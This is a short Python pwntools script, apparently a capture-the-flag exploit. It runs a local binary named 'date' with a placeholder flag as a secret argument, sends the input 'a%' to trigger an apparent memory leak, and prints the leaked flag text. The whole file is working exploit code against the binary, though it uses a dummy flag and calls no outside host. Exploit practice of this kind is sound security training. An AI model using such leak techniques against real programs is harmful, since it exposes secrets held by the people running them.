from pwn import *

p = process(["./date", "--secret=flag{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}"])

p.sendline("a%")
response = p.recvall()

print response[response.index('flag'):response.index('flag') + 100]